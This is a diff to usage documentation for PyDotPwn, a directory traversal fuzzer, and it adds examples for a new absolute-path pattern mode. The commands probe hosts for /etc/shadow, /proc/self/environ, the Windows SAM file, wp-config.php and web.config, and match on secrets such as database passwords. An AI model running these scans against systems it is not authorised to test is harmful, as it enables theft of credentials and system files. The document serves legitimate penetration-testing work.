@@ -21,17 +21,37 @@ This section provides comprehensive examples of using PyDotPwn in real-world sec
 
 ## 🌐 Web Application Testing
 
-### Basic Web Application Scan
+### 🆕 Modern Web Application Scan with Absolute Path Detection
 
-**Scenario**: Testing a standard web application for directory traversal vulnerabilities.
+**Scenario**: Testing a web application with comprehensive absolute path detection (NEW FEATURE).
 
 #### CLI Command
 ```bash
-# Basic HTTP scan looking for /etc/passwd
-python dotdotpwn.py --module http --host webapp.company.com --file /etc/passwd --pattern "root:" --depth 8
+# NEW: Enhanced scan with absolute path patterns (144+ patterns)
+python dotdotpwn.py --module http --host webapp.company.com --file /etc/passwd --pattern "root:" --depth 8 --absolute
+
+# NEW: Generate patterns only (no scanning)
+python dotdotpwn.py generate --os-type unix --file /etc/passwd --depth 5 --absolute
+
+# NEW: Multiple target file aliases supported
+python dotdotpwn.py --module http --host webapp.company.com -f /etc/passwd --pattern "root:" --absolute
+python dotdotpwn.py --module http --host webapp.company.com --target-file /etc/shadow --pattern "root:" --absolute
+python dotdotpwn.py --module http --host webapp.company.com --specific-file /etc/hosts --depth 6 --absolute
 
 # Enhanced scan with OS detection
-python dotdotpwn.py --module http --host webapp.company.com --ssl --detect-os --service-detection --break-on-first --pattern "root:"
+python dotdotpwn.py --module http --host webapp.company.com --ssl --detect-os --service-detection --break-on-first --pattern "root:" --absolute
+```
+
+### 📊 Pattern Generation Comparison
+
+```bash
+# Original approach (relative only)
+python dotdotpwn.py generate --file /etc/passwd --depth 6 --no-absolute
+# Output: 1,778 patterns (0.11% absolute coverage)
+
+# NEW: Enhanced approach (with absolute paths)  
+python dotdotpwn.py generate --file /etc/passwd --depth 6 --absolute
+# Output: 1,922 patterns (7.5% absolute coverage, 144 absolute patterns)
 ```
 
 #### GUI Configuration
@@ -76,20 +96,58 @@ python dotdotpwn.py --module http --host shop.example.com --file wp-config.php -
 python dotdotpwn.py --module http --host winshop.example.com --os-type windows --file web.config --pattern "connectionString" --depth 6
 ```
 
+### 🆕 Cross-Platform Testing Examples
+
+**Scenario**: Comprehensive testing for both UNIX and Windows systems with absolute path detection.
+
+#### UNIX System Testing
+```bash
+# NEW: Comprehensive UNIX testing with absolute paths
+python dotdotpwn.py --module http --host linux.server.com --file /etc/passwd --absolute --depth 6
+# Generates patterns like: /etc/passwd, %2fetc%2fpasswd, ../../../etc/passwd
+
+# NEW: Test multiple critical UNIX files
+python dotdotpwn.py --module http --host linux.server.com --file /etc/shadow --absolute --pattern "root:"
+python dotdotpwn.py --module http --host linux.server.com --file /proc/self/environ --absolute --pattern "PATH"
+python dotdotpwn.py --module http --host linux.server.com --file /var/log/auth.log --absolute --pattern "authentication"
+
+# NEW: Generate UNIX patterns for offline analysis
+python dotdotpwn.py generate --os-type unix --file /etc/passwd --depth 8 --absolute > unix_patterns.txt
+```
+
+#### Windows System Testing  
+```bash
+# NEW: Comprehensive Windows testing with absolute paths
+python dotdotpwn.py --module http --host windows.server.com --file "c:\\windows\\system32\\config\\sam" --absolute --depth 5
+# Generates patterns like: c:\windows\system32\config\sam, %2fc%5cwindows%5csystem32%5cconfig%5csam
+
+# NEW: Test critical Windows files
+python dotdotpwn.py --module http --host windows.server.com --file "c:\\boot.ini" --absolute --pattern "Windows"
+python dotdotpwn.py --module http --host iis.server.com --file "c:\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log" --absolute --pattern "GET"
+
+# NEW: Generate Windows patterns
+python dotdotpwn.py generate --os-type windows --file "c:\\windows\\system32\\config\\sam" --depth 6 --absolute > windows_patterns.txt
+```
+
 ### CMS Vulnerability Testing
 
-**Scenario**: Testing popular Content Management Systems.
+**Scenario**: Testing popular Content Management Systems with enhanced absolute path detection.
 
 #### WordPress Testing
 ```bash
-# WordPress configuration file
-python dotdotpwn.py --module http --host wordpress.site.com --file wp-config.php --pattern "DB_PASSWORD" --depth 8
+# NEW: WordPress with absolute path detection
+python dotdotpwn.py --module http --host wordpress.site.com --file wp-config.php --pattern "DB_PASSWORD" --depth 8 --absolute
 
-# WordPress admin files
-python dotdotpwn.py --module http --host wordpress.site.com --file wp-admin/setup-config.php --pattern "wp-config" --depth 6
+# NEW: Using multiple parameter aliases
+python dotdotpwn.py --module http --host wordpress.site.com -f wp-config.php --pattern "DB_PASSWORD" --absolute
+python dotdotpwn.py --module http --host wordpress.site.com --target-file wp-config.php --pattern "DB_PASSWORD" --absolute  
+python dotdotpwn.py --module http --host wordpress.site.com --specific-file wp-config.php --pattern "DB_PASSWORD" --absolute
 
-# With authentication
-python dotdotpwn.py --module http --host wordpress.site.com --username admin --password password123 --file wp-config.php --pattern "DB_"
+# WordPress admin files with absolute paths
+python dotdotpwn.py --module http --host wordpress.site.com --file wp-admin/setup-config.php --pattern "wp-config" --depth 6 --absolute
+
+# With authentication and absolute paths
+python dotdotpwn.py --module http --host wordpress.site.com --username admin --password password123 --file wp-config.php --pattern "DB_" --absolute
 ```
 
 #### Drupal Testing
